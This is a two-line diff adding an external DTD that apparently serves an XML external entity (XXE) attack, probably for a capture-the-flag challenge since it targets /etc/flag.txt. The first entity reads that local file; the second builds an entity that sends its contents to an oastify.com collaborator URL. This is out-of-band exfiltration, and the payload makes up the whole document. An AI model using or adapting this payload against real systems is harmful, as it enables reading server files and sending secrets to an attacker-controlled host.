@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///etc/flag.txt">
+<!ENTITY % int "<ENTITY &#37; send SYSTEM 'http://bcrhb4qwztq7v8q3beyjp35zsqyhmaaz.oastify.com/?%file;'>">
